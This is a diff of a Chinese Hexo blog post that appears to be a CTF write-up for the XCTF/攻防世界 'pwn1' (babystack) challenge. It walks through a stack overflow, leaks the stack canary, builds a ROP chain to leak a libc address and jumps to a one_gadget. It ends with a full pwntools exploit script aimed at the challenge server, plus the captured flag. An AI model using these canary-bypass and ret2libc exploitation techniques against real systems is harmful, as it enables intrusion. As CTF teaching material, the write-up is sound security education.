@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>【攻防世界】Pwn系列之level3 |  小透的少年江湖</title>
+      <title>【攻防世界】Pwn系列之pwn1 |  小透的少年江湖</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/haoyun.ico" />
@@ -69,7 +69,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  【攻防世界】Pwn系列之level3
+  【攻防世界】Pwn系列之pwn1
 </h1>
  
 
@@ -89,7 +89,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">8</span>
+            <span class="post-count">1k</span>
         </span>
     </span>
 
@@ -98,7 +98,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">4 分钟</span>
         </span>
     </span>
 </div>
@@ -113,7 +113,49 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="【攻防世界】Pwn系列之level3"><a href="#【攻防世界】Pwn系列之level3" class="headerlink" title="【攻防世界】Pwn系列之level3"></a>【攻防世界】Pwn系列之level3</h1> 
+  <h1 id="【攻防世界】Pwn系列之pwn1"><a href="#【攻防世界】Pwn系列之pwn1" class="headerlink" title="【攻防世界】Pwn系列之pwn1"></a>【攻防世界】Pwn系列之pwn1</h1><p>该样本设置了RELRO和Cannary安全设置，所以加载的函数地址为随机地址化。所以需要绕过cannary和RELRO</p>
+<img src="/2024/01/26/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel3/image-20240426165609105.png" class title="image-20240426165609105">
+
+<p>我们首先运行下程序，有三个功能(保存、输出和退出)</p>
+<img src="/2024/01/26/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel3/image-20240426185551336.png" class title="image-20240426185551336">
+
+<p>接下来使用IDA反汇编程序查看伪代码逻辑</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]这就是cannary</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL); <span class="comment">//申请s内存地址</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )<span class="comment">//进入循环体</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_4008B9(); <span class="comment">//输出菜单</span></span><br><span class="line">    v3 = sub_400841();<span class="comment">//获取输入</span></span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(s);<span class="comment">//输出s</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL); <span class="comment">//s中写入数据</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_400826(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_400826(&amp;unk_400AE7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里关注下函数体中的s数组，点击查看堆栈位置位于0x0090</p>
+<img src="/2024/01/26/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel3/image-20240426190302807.png" class title="image-20240426190302807">
+
+<p>这里未对数组越界进行检查，存在数组越界溢出漏洞。</p>
+<p>由于设置了Cannary，首先需要绕过Cannary，办法就是获取Cannary在栈中的值，在构造payload的直接填充上该值，使得检测成功绕过Cannary。从上方伪代码中可以看出v6就是插入的Cannary值，从s到v6中间相差0x88距离，所以可以通过填充0x88字节来获取得到v6的值，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x88</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;1&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt; &quot;,&quot;2&quot;)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*0x88+&#x27;\n&#x27;)</span><br><span class="line">cannary_addr = u64(p.recv(7).rjust(8,b&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在绕过Cannary后，就需要寻找命令执行函数，在源程序或者libc库中寻找相关函数，在libc中可找到execve()，使用小工具one_gadget寻找在libc中地址为<strong>0x45216</strong></p>
+<img src="/2024/01/26/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel3/image-20240426192843399.png" class title="image-20240426192843399">
+
+<p>由于开启了地址随机化，在加载时地址发生变化，通过puts()函数在程序加载时的地址来定位execve()的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">execve_addr = puts_addr -(libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-execve)</span><br></pre></td></tr></table></figure>
+
+<p>所以这里的问题就是<strong>如何获得puts()函数的记载地址?</strong></p>
+<p>这里就要用到溢出打印出puts()函数地址，由于这里是x64位程序，传参时使用<strong>rdi、rsi、rdx、rcd、r8、r9</strong>这6个寄存器，超过这6个参数就进栈。</p>
+<p>使用rdi寄存器保存puts_got的值，调用puts_plt()打印出puts_got的地址，调用函数后还需指定返回地址，所有堆栈结果大致如下：</p>
+<img src="/2024/01/26/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel3/image-20240426195625727.png" class title="image-20240426195625727">
+
+<p>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(cannary_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> +p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>上述代码可以得到puts_addr的地址，然后通过**puts_addr -(libc.symbols[‘puts’]-execve)**计算得到execve的地址</p>
+<p>接下来进入main后再次造成溢出，直接构造payload将返回地址修改为execve地址，从而造成命令执行，如下代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">execve_addr = puts_addr -(libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-execve)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> +p64(cannary_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(execve_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>完整代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">65052</span>)</span><br><span class="line">execve = <span class="number">0x45216</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400a93</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#canary = u64(p.recv(7).rjust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">cannary_addr = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(cannary_addr)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(cannary_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> +p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">execve_addr = puts_addr -(libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-execve)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> +p64(cannary_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(execve_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/01/26/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Blevel3/image-20240426200341453.png" class title="image-20240426200341453">
+
+<p>得到flag为<strong>cyberpeace{5a5fbd06e649f29b14ed9481aa96b22f}</strong></p>
+ 
       <!-- reward -->
       
       <div id="reword-out">
